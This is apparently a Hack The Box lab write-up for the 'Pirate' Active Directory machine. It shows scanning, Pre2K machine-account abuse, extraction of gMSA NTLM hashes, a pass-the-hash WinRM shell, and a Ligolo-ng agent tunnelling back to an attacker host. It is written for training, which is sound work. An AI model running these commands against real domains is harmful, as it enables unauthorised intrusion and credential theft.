---
title: Pirate
date: 2026-07-09
excerpt: HackTheBox - Hard
cover: ../uploads/cover_pirate.jpg
tags: NTLM Relay, Kerberos Delegation, Pre2k Abuse, Forging Service Ticket
---

Welcome back to another Hack The Box writeup! In this walkthrough, we will be taking on **Pirate**, an Active Directory-focused machine that challenges players to demonstrate a wide range of enumeration, privilege escalation, and post-exploitation techniques. Throughout this engagement, we will systematically identify attack paths, analyze the environment, and leverage misconfigurations to gain deeper access into the domain. This machine highlights the importance of thorough enumeration, understanding Active Directory fundamentals, and effectively chaining multiple findings together to achieve full compromise.

![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2F271954773-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FYsivTjPn2jLXI0ZgVqeF%252Fuploads%252Fi5DquSb5fvJEB5XLD7Sx%252F200.gif%3Falt%3Dmedia%26token%3D72508af4-ebc1-432e-bc62-669ea93d6d50&width=768&dpr=3&quality=100&sign=529a953a&sv=2)

## Initial Enumeration and Attack Surface Discovery

The engagement begins with an `Nmap` scan to discover accessible hosts, open ports, and running services within the target environment.

```shell
┌──(kuroshiro㉿a1sberg)-[~/HTB/Pirate]
└─$ nmap -A -T5 10.129.244.95
Starting Nmap 7.95 ( https://nmap.org ) at 2026-07-15 02:39 EDT
Nmap scan report for 10.129.244.95
Host is up (0.10s latency).
Not shown: 986 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
80/tcp   open  http          Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: IIS Windows Server
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-07-15 13:39:33Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: pirate.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2026-07-15T13:41:01+00:00; +6h59m50s from scanner time.
| ssl-cert: Subject: commonName=DC01.pirate.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.pirate.htb
| Not valid before: 2026-07-15T13:25:41
|_Not valid after:  2027-07-15T13:25:41
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: pirate.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2026-07-15T13:41:00+00:00; +6h59m50s from scanner time.
| ssl-cert: Subject: commonName=DC01.pirate.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.pirate.htb
| Not valid before: 2026-07-15T13:25:41
|_Not valid after:  2027-07-15T13:25:41
2179/tcp open  vmrdp?
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: pirate.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2026-07-15T13:41:01+00:00; +6h59m50s from scanner time.
| ssl-cert: Subject: commonName=DC01.pirate.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.pirate.htb
| Not valid before: 2026-07-15T13:25:41
|_Not valid after:  2027-07-15T13:25:41
3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: pirate.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2026-07-15T13:41:00+00:00; +6h59m50s from scanner time.
| ssl-cert: Subject: commonName=DC01.pirate.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.pirate.htb
| Not valid before: 2026-07-15T13:25:41
|_Not valid after:  2027-07-15T13:25:41
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2019|10 (97%)
OS CPE: cpe:/o:microsoft:windows_server_2019 cpe:/o:microsoft:windows_10
Aggressive OS guesses: Windows Server 2019 (97%), Microsoft Windows 10 1903 - 21H1 (91%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 6h59m49s, deviation: 0s, median: 6h59m49s
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2026-07-15T13:40:23
|_  start_date: N/A

TRACEROUTE (using port 139/tcp)
HOP RTT      ADDRESS
1   95.23 ms 10.10.14.1
2   95.58 ms 10.129.244.95

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 100.00 seconds
```

The Nmap scan revealed multiple services commonly associated with a Microsoft Active Directory Domain Controller. The presence of Kerberos (88/TCP), LDAP (389/TCP, 636/TCP), Global Catalog services (3268/TCP, 3269/TCP), SMB (445/TCP), and DNS (53/TCP) strongly suggests that the target is functioning as a Domain Controller within an Active Directory environment.

LDAP service enumeration disclosed the domain name **pirate.htb** and identified the host as **DC01.pirate.htb**, providing valuable information for subsequent domain-based attacks and authentication attempts. The SSL certificates presented by the LDAP services further confirmed the hostname and domain affiliation.

The DNS service running on port 53 may allow domain-related enumeration, including host discovery and potential zone transfer testing. Since Active Directory environments heavily rely on DNS for service discovery, this service represents a key target for further reconnaissance.

The SMB service on port 445 is of particular interest as it may expose shared resources, user information, and authentication mechanisms. Additionally, SMB signing is enabled and required, mitigating certain relay-based attacks but not preventing enumeration or credential-based access.

Kerberos services on ports 88 and 464 indicate that domain authentication is handled through Kerberos, making attacks such as AS-REP Roasting, Kerberoasting, and Service Principal Name (SPN) enumeration potential avenues for obtaining credentials, depending on domain configuration.

The HTTP service hosted on port 80 is running Microsoft IIS 10.0. Nmap identified the HTTP TRACE method as enabled, which is generally considered a potentially risky configuration. While modern browsers mitigate many TRACE-related attacks, the web service should be examined further for additional content, virtual hosts, directories, and authentication portals.

Port 5985 exposes Windows Remote Management (WinRM), a service frequently leveraged for remote administration. While authentication is required, valid domain credentials obtained during the assessment may later provide remote shell access through this service.

Based on the discovered services and host naming conventions, the target appears to be a Windows Server 2019 Domain Controller within the **pirate.htb** Active Directory domain. The initial attack surface suggests that further efforts should focus on Active Directory enumeration through LDAP, Kerberos, SMB, and DNS services to identify users, service accounts, misconfigurations, and potential privilege escalation paths.

The provided assessment scope includes a set of valid domain credentials that can be leveraged for authenticated enumeration. These credentials will allow us to gather additional information from services such as SMB and LDAP, which often expose significantly more data to authenticated users than to anonymous connections.

As part of the initial foothold, the following domain account was supplied:

**Username:** pentest
**Password:** p3nt3st2025!&

Using these credentials, we can begin authenticated reconnaissance to enumerate users, groups, shares, policies, and other Active Directory objects that may reveal potential attack paths within the environment.

Before proceeding with domain enumeration, we first add the discovered domain and hostname entries to our `/etc/hosts` file to ensure proper name resolution within the Active Directory environment:

```text
10.129.244.95    DC01.pirate.htb    pirate.htb    DC01
```

Now let's enumerate

The SMB authentication test successfully validated the supplied **pentest** credentials against the **pirate.htb** domain. The target was identified as **DC01**, a Windows Server 2019 Domain Controller with SMB signing enabled and SMBv1 disabled.

```shell
┌──(kuroshiro㉿a1sberg)-[~/HTB/Pirate]
└─$ nxc smb pirate.htb -u 'pentest' -p 'p3nt3st2025!&'
SMB         10.129.244.95   445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:pirate.htb) (signing:True) (SMBv1:False)
SMB         10.129.244.95   445    DC01             [+] pirate.htb\pentest:p3nt3st2025!&
```

An LDAP authentication test was also performed to verify access to Active Directory services. The supplied **pentest** credentials successfully authenticated against the LDAP service on **DC01**, confirming that the account can be used for authenticated directory enumeration.

```shell
┌──(kuroshiro㉿a1sberg)-[~/HTB/Pirate]
└─$ nxc ldap pirate.htb -u 'pentest' -p 'p3nt3st2025!&'
LDAP        10.129.244.95   389    DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:pirate.htb)
LDAP        10.129.244.95   389    DC01             [+] pirate.htb\pentest:p3nt3st2025!& 
```

Before testing Kerberos authentication, it is important to synchronize our system time with the Domain Controller. Kerberos is highly sensitive to time discrepancies, and even a small clock skew between the client and the server can result in authentication failures. By ensuring that our machine's time closely matches that of **DC01**, we can avoid potential Kerberos-related errors and guarantee accurate results during subsequent authentication and enumeration activities.

```shell
┌──(kuroshiro㉿a1sberg)-[~/HTB/Pirate]
└─$ sudo ntpdate -u pirate.htb
[sudo] password for kuroshiro: 
2026-07-15 09:47:07.115272 (-0400) +25190.052732 +/- 0.033043 pirate.htb 10.129.244.95 s1 no-leap
CLOCK: time stepped by 25190.052732
```

The `ntpdate` synchronization was successful, confirming that the local system clock was significantly out of sync with the Domain Controller. The output indicates a time difference of approximately **25,190 seconds** (roughly 7 hours), which was automatically corrected by stepping the local clock to match the domain time source. This adjustment is crucial for Kerberos-based operations, as excessive clock skew would prevent successful ticket requests and authentication. With the system time now synchronized, we can proceed with Kerberos enumeration and authentication without encountering time-related errors.

To prepare for Kerberos-based authentication, we used `NetExec (nxc)` to automatically generate a Kerberos configuration file. `NetExec` is a post-exploitation and enumeration framework that can gather domain information and create a properly configured `krb5.conf`, eliminating the need to manually define Kerberos settings.

```shell
┌──(kuroshiro㉿a1sberg)-[~/HTB/Pirate]
└─$ netexec smb pirate.htb -u 'pentest' -p 'p3nt3st2025!&' --generate-krb5-file ./krb5.conf
SMB         10.129.244.95   445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:pirate.htb) (signing:True) (SMBv1:False)
SMB         10.129.244.95   445    DC01             [+] pirate.htb\pentest:p3nt3st2025!& 
```

The command successfully authenticated to the target using the **pentest** account and generated a `krb5.conf` file containing the necessary realm and KDC information for the **pirate.htb** domain. Examining the generated configuration shows that **PIRATE.HTB** is the Kerberos realm, while **dc01.pirate.htb** serves as both the Key Distribution Center (KDC) and the administrative server. Additionally, the domain-to-realm mappings ensure that Kerberos-aware tools correctly associate hosts within the `pirate.htb` domain with the appropriate realm.

```shell
┌──(kuroshiro㉿a1sberg)-[~/HTB/Pirate]
└─$ cat krb5.conf

[libdefaults]
    dns_lookup_kdc = false
    dns_lookup_realm = false
    default_realm = PIRATE.HTB

[realms]
    PIRATE.HTB = {
        kdc = dc01.pirate.htb
        admin_server = dc01.pirate.htb
        default_domain = pirate.htb
    }

[domain_realm]
    .pirate.htb = PIRATE.HTB
    pirate.htb = PIRATE.HTB
```

This configuration will be utilized by various Kerberos-capable tools, including **Impacket**, **BloodHound**, **NetExec**, and other Active Directory enumeration utilities, allowing them to request tickets and authenticate seamlessly using Kerberos throughout the assessment.

Before utilizing Kerberos authentication, the generated Kerberos configuration file must be loaded into the current session. This is accomplished by setting the `KRB5_CONFIG` environment variable, which instructs Kerberos-aware applications to use the custom `krb5.conf` file rather than the system-wide configuration.

```shell
┌──(kuroshiro㉿a1sberg)-[~/HTB/Pirate]
└─$ export KRB5_CONFIG=./krb5.conf 
```

After exporting the configuration, a Kerberos authentication test was performed using `NetExec` against the SMB service. The successful authentication confirms that the Kerberos configuration is valid and that the client can properly communicate with the Domain Controller to obtain Kerberos tickets. This verifies that the environment is correctly configured for Kerberos-based operations.

```shell
┌──(kuroshiro㉿a1sberg)-[~/HTB/Pirate]
└─$ nxc smb pirate.htb -u 'pentest' -p 'p3nt3st2025!&' -k                                                                                  
SMB         pirate.htb      445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:pirate.htb) (signing:True) (SMBv1:False)
SMB         pirate.htb      445    DC01             [+] pirate.htb\pentest:p3nt3st2025!& 
```

## Active Directory Enumeration Through LDAP and BloodHound

With Kerberos functionality confirmed, LDAP enumeration was performed to identify domain users. Using the authenticated **pentest** account, NetExec successfully enumerated seven user accounts within the **pirate.htb** domain, including the built-in accounts (**Administrator**, **Guest**, and **krbtgt**) as well as several domain users (**a.white**, **a.white\_adm**, **pentest**, and **j.sparrow**). The presence of an account named **a.white\_adm** is particularly noteworthy, as the naming convention suggests elevated administrative privileges, making it a potential target for further enumeration and privilege escalation activities.

```shell
┌──(kuroshiro㉿a1sberg)-[~/HTB/Pirate]
└─$ nxc ldap pirate.htb -u 'pentest' -p 'p3nt3st2025!&' --users
LDAP        10.129.244.95   389    DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:pirate.htb)                                                                                  
LDAP        10.129.244.95   389    DC01             [+] pirate.htb\pentest:p3nt3st2025!&               
LDAP        10.129.244.95   389    DC01             [*] Enumerated 7 domain users: pirate.htb          
LDAP        10.129.244.95   389    DC01             -Username-                    -Last PW Set-       -BadPW-  -Description-                                                                                  
LDAP        10.129.244.95   389    DC01             Administrator                 2025-06-08 14:32:36 0        Built-in account for administering the computer/domain                                         
LDAP        10.129.244.95   389    DC01             Guest                         <never>             0        Built-in account for guest access to the computer/domain                                       
LDAP        10.129.244.95   389    DC01             krbtgt                        2025-06-08 14:40:29 0        Key Distribution Center Service Account                                                        
LDAP        10.129.244.95   389    DC01             a.white_adm                   2026-01-16 00:36:34 0
LDAP        10.129.244.95   389    DC01             a.white                       2025-06-08 19:33:01 0
LDAP        10.129.244.95   389    DC01             pentest                       2025-06-09 13:40:23 0
LDAP        10.129.244.95   389    DC01             j.sparrow                     2025-06-09 15:08:44 0
```

To gain a deeper understanding of the Active Directory environment, `BloodHound` was used to collect domain information using the **pentest** account. The data was gathered with `bloodhound-python`, which queries LDAP, SMB, and other domain services to identify users, groups, permissions, and potential privilege escalation paths. The collected data was then imported into BloodHound for graphical analysis.

```shell
┌──(kuroshiro㉿a1sberg)-[~/HTB/Pirate]
└─$ bloodhound-ce-python -dc 'DC01.pirate.htb' -d 'pirate.htb' -u 'pentest' -p 'p3nt3st2025!&' -ns 10.129.244.95 --zip -c All 
INFO: BloodHound.py for BloodHound Community Edition
INFO: Found AD domain: pirate.htb
INFO: Getting TGT for user
INFO: Connecting to LDAP server: DC01.pirate.htb
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 4 computers
INFO: Connecting to LDAP server: DC01.pirate.htb
INFO: Connecting to GC LDAP server: dc01.pirate.htb
INFO: Found 10 users
INFO: Found 54 groups
INFO: Found 2 gpos
INFO: Found 1 ous
INFO: Found 20 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: 
INFO: Querying computer: 
INFO: Querying computer: WEB01.pirate.htb
INFO: Querying computer: DC01.pirate.htb
INFO: Done in 00M 17S
INFO: Compressing output into 20260715071303_bloodhound.zip
```

Upon reviewing the collected information, the **pentest** account appears to be a standard domain user with membership limited to the **Domain Users** group. No privileged group memberships, delegated permissions, or obvious attack paths were immediately identified from this account. While this indicates that the account has minimal privileges, the BloodHound analysis provides a valuable baseline for understanding the domain structure and may reveal additional relationships as further enumeration is performed.

![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2F271954773-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FYsivTjPn2jLXI0ZgVqeF%252Fuploads%252FUNBWsQnwi6NrtOa3wsVR%252FScreenshot%2520%282913%29.png%3Falt%3Dmedia%26token%3D8a5096e6-4c7d-4ca6-8ea7-a455e96d51ab&width=768&dpr=3&quality=100&sign=5cbf7307&sv=2)

A notable finding from the BloodHound analysis is the presence of the **Pre-Windows 2000 Compatible Access** group. This group is commonly found in legacy Active Directory environments and is often retained in modern domains to maintain compatibility with older Windows NT systems. Members of this group are typically granted additional directory read permissions that were historically required by legacy authentication mechanisms.

![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2F271954773-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FYsivTjPn2jLXI0ZgVqeF%252Fuploads%252FJxfX37EsDZYQFnRVe1xU%252FScreenshot%2520%282914%29.png%3Falt%3Dmedia%26token%3D3b25d1cb-c8f1-49d1-8f86-8ff43b72077c&width=768&dpr=3&quality=100&sign=a3ab7970&sv=2)

Since the target environment still supports **NTLM authentication** rather than enforcing Kerberos exclusively, the existence of this group becomes particularly interesting. In many cases, these legacy compatibility settings can allow authenticated users to access information that may not otherwise be available, potentially exposing additional attack surface during Active Directory enumeration. As a result, this finding warrants further investigation to determine whether the relaxed read permissions can be leveraged to obtain sensitive domain information or identify new attack paths.

Examining the membership relationships of the **Pre-Windows 2000 Compatible Access** group reveals an overly permissive configuration. The group includes memberships inherited by a wide range of security principals, including **Authenticated Users**, **Domain Users**, **Domain Computers**, service accounts, administrative accounts, and standard user accounts. As a result, virtually every authenticated identity within the domain benefits from the permissions granted by this legacy compatibility group.

![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2F271954773-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FYsivTjPn2jLXI0ZgVqeF%252Fuploads%252FLnIU6ycAZAuRgaNNxs5M%252FScreenshot%2520%282915%29.png%3Falt%3Dmedia%26token%3Dc6cbfe68-6c53-4dfb-a2f2-b163cd4f1709&width=768&dpr=3&quality=100&sign=513bd6a&sv=2)

This configuration reflects a common legacy design intended to support older Windows environments. However, from a security perspective, it significantly broadens the scope of information accessible to low-privileged users. Since the **pentest** account is a member of **Domain Users**, it indirectly inherits these permissions and may be able to perform more extensive Active Directory enumeration than would normally be expected from a standard domain account.

The graph also shows that not only user accounts but domain-joined computers such as **DC01**, **WEB01**, **EXCH01**, and **MS01** are associated with this trust chain, reinforcing the idea that the legacy permissions are widely applied throughout the environment. This finding suggests that additional LDAP enumeration should be performed, as sensitive information about users, computers, service accounts, or authentication settings may be exposed to any authenticated domain user.

Continuing our BloodHound analysis, we examined other domain accounts to identify potential privilege escalation paths. During this process, we discovered that **a.white** possesses the ability to modify the password of **a.white\_adm**. This relationship is particularly significant, as password reset privileges can effectively provide control over the target account without requiring knowledge of its current credentials.

![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2F271954773-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FYsivTjPn2jLXI0ZgVqeF%252Fuploads%252FcCHMFxAtbMYJ3zI8zKRc%252FScreenshot%2520%282917%29.png%3Falt%3Dmedia%26token%3D66273b83-8622-480e-9474-fcd47e6f21ae&width=768&dpr=3&quality=100&sign=c5f55ecb&sv=2)

Based on the findings gathered so far, a potential attack path begins to emerge. If we can leverage the permissions exposed through the **Pre-Windows 2000 Compatible Access** configuration to gain access to **a.white**, we can then abuse the password reset rights assigned to that account to take control of **a.white\_adm**. This establishes a clear privilege escalation chain from a low-privileged user toward a more privileged account within the domain.

## Gaining Control of a Machine Account via Pre2K Abuse

Having identified the **Pre-Windows 2000 Compatible Access** configuration as a potential attack vector, the next step was to leverage it using NetExec's **pre2k** module. This module searches for pre-created computer accounts that remain vulnerable to legacy authentication behavior and attempts to obtain Kerberos tickets for them.

```shell
┌──(kuroshiro㉿a1sberg)-[~/HTB/Pirate]
└─$ nxc ldap pirate.htb -u 'pentest' -p 'p3nt3st2025!&' -M pre2k                                                                                                        
LDAP        10.129.6.9      389    DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:pirate.htb)
LDAP        10.129.6.9      389    DC01             [+] pirate.htb\pentest:p3nt3st2025!& 
PRE2K       10.129.6.9      389    DC01             Pre-created computer account: MS01$
PRE2K       10.129.6.9      389    DC01             Pre-created computer account: EXCH01$
PRE2K       10.129.6.9      389    DC01             [+] Found 2 pre-created computer accounts. Saved to /home/kuroshiro/.nxc/modules/pre2k/pirate.htb/precreated_computers.txt
PRE2K       10.129.6.9      389    DC01             [+] Successfully obtained TGT for ms01@pirate.htb
PRE2K       10.129.6.9      389    DC01             [+] Successfully obtained TGT for exch01@pirate.htb
PRE2K       10.129.6.9      389    DC01             [+] Successfully obtained TGT for 2 pre-created computer accounts. Saved to /home/kuroshiro/.nxc/modules/pre2k/ccache
```

The enumeration revealed two pre-created computer accounts: **MS01** and **EXCH01** . NetExec was able to successfully request and obtain Kerberos Ticket Granting Tickets (TGTs) for both accounts, indicating that they are susceptible to the Pre-Windows 2000 compatibility issue. These tickets were automatically saved as Kerberos credential cache (`ccache`) files for later use.

This finding provides an initial foothold beyond the low-privileged **pentest** account and allows us to impersonate one of the affected computer accounts during subsequent enumeration activities.

After obtaining the Kerberos tickets, the generated credential cache files were copied into the current working directory. This step simplifies ticket management and allows the tickets to be easily referenced during subsequent Kerberos-authenticated operations.

```shell
┌──(kuroshiro㉿a1sberg)-[~/HTB/Pirate]
└─$ cp ~/.nxc/modules/pre2k/ccache/* . 
```

At this stage, additional BloodHound analysis was performed to identify opportunities for privilege escalation. By examining the **Group Delegated Object Control** relationships, we discovered that the compromised machine account possesses the **ReadGMSAPassword** privilege over managed service accounts. This permission allows authorized principals to retrieve gMSA passwords directly from Active Directory.

![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2F271954773-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FYsivTjPn2jLXI0ZgVqeF%252Fuploads%252FDCWLN6kZXUn1eERYZTth%252FScreenshot%2520%282918%29.png%3Falt%3Dmedia%26token%3D55a89b28-fb75-4043-9f97-340ab7cae440&width=768&dpr=3&quality=100&sign=106f8c96&sv=2)

Since **MS01$** is able to read the password of **gMSA\_ADFS\_prod$** (and other managed service accounts), the account can be leveraged to obtain valid authentication material. These credentials may then be used for lateral movement and remote access to systems where the gMSA account is authorized to log in, making it a valuable stepping stone toward further domain compromise.

## Extracting gMSA Credentials Through Delegated Permissions

With control of the **MS01$** machine account established, authenticated LDAP enumeration was performed using Kerberos authentication.

```shell
┌──(kuroshiro㉿a1sberg)-[~/HTB/Pirate]
└─$ nxc ldap pirate.htb -u 'MS01$' -p 'ms01' --gmsa -k                                                                                                                  
LDAP        pirate.htb      389    DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:pirate.htb)
LDAPS       pirate.htb      636    DC01             [+] pirate.htb\MS01$:ms01 
LDAPS       pirate.htb      636    DC01             [*] Getting GMSA Passwords
LDAPS       pirate.htb      636    DC01             Account: gMSA_ADCS_prod$      NTLM: 8e142bbd224b307f3cb31752b29f4893     PrincipalsAllowedToReadPassword: Domain Secure Servers                                                                                                                                                             
LDAPS       pirate.htb      636    DC01             Account: gMSA_ADFS_prod$      NTLM: 30e4066182bb2c81dcd950b2fbb16564     PrincipalsAllowedToReadPassword: Domain Secure Servers  
```

The enumeration was successful and revealed two gMSA accounts: **gMSA\_ADCS\_prod** and **gMSA\_ADFS\_prod**. More importantly, NetExec was able to retrieve the corresponding NTLM password hashes for both accounts. Since gMSA passwords are automatically managed by Active Directory, access to these credentials often provides a valuable opportunity for lateral movement or privilege escalation.

The output also indicates that the passwords are readable by members of the **Domain Secure Servers** group, suggesting that the compromised computer account possesses the necessary permissions to access these managed credentials.

After obtaining the NTLM hash of **gMSA\_ADCS\_prod$**, a `Pass-the-Hash` attack was performed against the WinRM service using `Evil-WinRM`. Instead of requiring the plaintext password, authentication was achieved directly using the retrieved NTLM hash.

```shell
┌──(kuroshiro㉿a1sberg)-[~/HTB/Pirate]
└─$ evil-winrm -i pirate.htb -u 'gMSA_ADCS_prod$' -H '8e142bbd224b307f3cb31752b29f4893'                                                 
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\gMSA_ADCS_prod$\Documents> 
```

The authentication succeeded, resulting in an interactive PowerShell session running under the context of **gMSA\_ADCS\_prod$**.

## Discovering the Internal Network

With an initial foothold established, the next step is to inspect the system's network configuration to gain a better understanding of the environment and identify any additional network segments that may be reachable from the compromised host.

```powershell
*Evil-WinRM* PS C:\Users\gMSA_ADCS_prod$\Documents> ipconfig

Windows IP Configuration


Ethernet adapter vEthernet (Switch01):

   Connection-specific DNS Suffix  . :
   Link-local IPv6 Address . . . . . : fe80::d976:c606:587e:f1e1%8
   IPv4 Address. . . . . . . . . . . : 192.168.100.1
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . :

Ethernet adapter Ethernet0 2:

   Connection-specific DNS Suffix  . : .htb
   IPv4 Address. . . . . . . . . . . : 10.129.6.9
   Subnet Mask . . . . . . . . . . . : 255.255.0.0
   Default Gateway . . . . . . . . . : 10.129.0.1
```

The `ipconfig` output reveals that the machine is connected to two separate networks. The first interface, **Ethernet0 2**, is connected to the primary HTB network and holds the address **10.129.6.9**, which corresponds to the Domain Controller. More interestingly, a second interface named **vEthernet (Switch01)** is configured with the address **192.168.100.1/24**, indicating the presence of an additional internal network segment.

The existence of this secondary network suggests that the host may be acting as a bridge or gateway to an isolated internal environment that is not directly accessible from our attacking machine. As a result, further enumeration of the **192.168.100.0/24** subnet may uncover additional systems and potential attack paths within the domain.

## Pivoting into the Internal Network via Ligolo-ng

Since the newly discovered `192.168.100.0/24` subnet is only accessible from the compromised host, a pivoting mechanism is required to reach this internal network from our attacker machine. To achieve this, `Ligolo-ng` was deployed, allowing us to create a tunnel through the compromised host and route traffic into the isolated network segment.

The first step involved creating and enabling a **TUN** interface named `ligolo` on the attack machine. This virtual network interface serves as the endpoint for traffic that will be forwarded through the Ligolo tunnel.

```shell
┌──(kuroshiro㉿a1sberg)-[~/HTB/Pirate]
└─$ sudo ip tuntap add user root mode tun ligolo 

┌──(kuroshiro㉿a1sberg)-[~/HTB/Pirate]
└─$ sudo ip link set ligolo up  
```

Next, the Ligolo agent was uploaded to the compromised host and executed. On the attacker machine, the Ligolo proxy was started and configured to accept incoming agent connections. Once the agent successfully connected back to the proxy, a session was established and the tunnel was activated.

**Evil-WinRM session**:

```powershell
*Evil-WinRM* PS C:\Temp> upload ligolo-ng/agent.exe
                                        
Info: Uploading /home/kuroshiro/HTB/Pirate/ligolo-ng/agent.exe to C:\Temp\agent.exe
                                        
Data: 14627496 bytes of 14627496 bytes copied
                                        
Info: Upload successful!

*Evil-WinRM* PS C:\Temp> .\agent.exe --connect 10.10.14.52:11601 -ignore-cert
agent.exe : time="2026-07-15T07:42:54-07:00" level=warning msg="warning, certificate validation disabled"
    + CategoryInfo          : NotSpecified: (time="2026-07-1...ation disabled":String) [], RemoteException
    + FullyQualifiedErrorId : NativeCommandError
time="2026-07-15T07:42:54-07:00" level=info msg="Connection established" addr="10.10.14 52:11601"
```

**Attacker:**

```shell
┌──(kuroshiro㉿a1sberg)-[~/HTB/Pirate]
└─$ sudo ligolo-proxy -selfcert                                                                                                           
INFO[0000] Loading configuration file ligolo-ng.yaml    
WARN[0000] Using default selfcert domain 'ligolo', beware of CTI, SOC and IoC! 
INFO[0000] Listening on 0.0.0.0:11601                   
    __    _             __                       
   / /   (_)___ _____  / /___        ____  ____ _                                                                                         
  / /   / / __ `/ __ \/ / __ \______/ __ \/ __ `/                                                                                         
 / /___/ / /_/ / /_/ / / /_/ /_____/ / / / /_/ /                                                                                          
/_____/_/\__, /\____/_/\____/     /_/ /_/\__, /                                                                                           
        /____/                          /____/                                                                                            
                                                                                                                                          
  Made in France ♥            by @Nicocha30!                                                                                              
  Version: dev                                                                                                                            
                                                                                                                                          
ligolo-ng »  

Command 20
ligolo-ng » INFO[0066] Agent joined.                                 id=00155d0bd000 name="PIRATE\\gMSA_ADCS_prod$@DC01" remote="10.129.6.9:54399"
ligolo-ng » 
ligolo-ng » session
? Specify a session : 1 - PIRATE\gMSA_ADCS_prod$@DC01 - 10.129.6.9:54399 - 00155d0bd000
[Agent : PIRATE\gMSA_ADCS_prod$@DC01] » start
INFO[0094] Starting tunnel to PIRATE\gMSA_ADCS_prod$@DC01 (00155d0bd000) 
```

After the tunnel was operational, a static route was added to direct traffic destined for the `192.168.100.0/24` subnet through the Ligolo interface. This effectively extended the attacker's network reach into the internal segment, allowing direct communication with hosts that were previously inaccessible.

```shell
┌──(kuroshiro㉿a1sberg)-[~/HTB/Pirate]
└─$ sudo ip route add 192.168.100.0/24 dev ligolo
```

To verify that the pivot was functioning correctly, an ICMP echo request was sent to **192.168.100.2**. The successful replies confirmed that the internal network was now reachable through the Ligolo tunnel and that pivoting had been successfully established.

```shell
┌──(kuroshiro㉿a1sberg)-[~/HTB/Pirate]
└─$ ping 192.168.100.2                                                                                             
PING 192.168.100.2 (192.168.100.2) 56(84) bytes of data.
64 bytes from 192.168.100.2: icmp_seq=1 ttl=64 time=104 ms
64 bytes from 192.168.100.2: icmp_seq=2 ttl=64 time=100 ms
64 bytes from 192.168.100.2: icmp_seq=3 ttl=64 time=78.6 ms
64 bytes from 192.168.100.2: icmp_seq=4 ttl=64 time=97.2 ms
64 bytes from 192.168.100.2: icmp_seq=5 ttl=64 time=79.5 ms
```

## Identifying WEB01 Through Internal Reconnaissance

With access to the internal network established through the Ligolo-ng tunnel, the next step was to perform reconnaissance against the newly discovered host at **192.168.100.2**. An Nmap scan was conducted to identify exposed services, determine the system's role within the environment, and uncover potential attack vectors.
